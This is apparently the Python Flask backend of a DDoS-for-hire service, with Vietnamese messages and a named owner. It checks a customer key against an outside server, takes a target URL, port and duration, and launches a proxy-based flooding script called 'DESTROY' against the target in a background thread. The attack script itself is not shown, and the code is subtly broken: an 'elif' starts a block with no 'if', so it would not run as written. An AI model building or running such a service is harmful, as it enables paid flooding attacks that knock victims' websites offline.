from flask import Flask, request, jsonify
import subprocess
import threading
import requests

app = Flask(__name__)

API_KEY_CHECK_URL = "http://dstat.vinaddns.com/getkey/api/key.php?key="

def validate_api_key(key):
    try:
        response = requests.get(API_KEY_CHECK_URL + key)
        if response.status_code == 200 and response.json().get("Status") == "success":
            return True, response.json().get("key")
    except requests.RequestException:
        pass
    return False, None

def authenticate_key(func):
    def wrapper(*args, **kwargs):
        key = request.args.get("key")
        is_valid, key_info = validate_api_key(key)
        if not is_valid:
            return jsonify({"error": "Invalid API key"}), 403
        return func(*args, key_info=key_info, **kwargs)
    return wrapper

@app.route('/api', methods=['GET'])
@authenticate_key
def execute_tool(key_info):
    try:
        methods = request.args.get('methods', 'Methods')
        url = request.args.get('url', '')
        time = request.args.get('time', '')        

        port = request.args.get('port', '')
        if not (methods and url and time and port):
            return jsonify({"Status": "error", "Noti": "Vui lòng nhập đầy đủ thông tin"}), 400

        valid_methods = [
            "VIP", "VIP2",  "PROXY"
        ]
        if methods not in valid_methods:
            return jsonify({"Status": "error", "Noti": "Methods không tồn tại hoặc bị thiếu vui lòng nhập lại"}), 400
        def execute_command():
             elif methods == "VIP":
                command = ['node', 'DESTROY', url, time, '64', '2', 'proxy.txt']
            elif methods == "VIP2":
                command = ['node', 'DESTROY', url, time, '64', '2', 'proxy.txt']
            elif methods == "PROXY":
                command = ['python', 'proxy.py']
            else:
                print(f"Phương thức không xác định: {methods}")
                return

            try:
                result = subprocess.run(command, capture_output=True, text=True, timeout=180)
                print(result.stdout)
                print(result.stderr)
            except subprocess.TimeoutExpired:
                print("Lệnh thực thi đã hết thời gian.")
            except Exception as e:
                print(f"Lỗi khi thực thi lệnh: {e}")

        threading.Thread(target=execute_command).start()

        result = {
            'Status': 'Success',
            'time': time,
            'Url': url,
            'Methods': methods,
            'Port': port,
            'Owner': 'BinhNG',
            'key': key_info
        }

        return jsonify(result)
    except Exception as e:
        print(e)
        return jsonify({'error': 'Lỗi máy chủ nội bộ'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)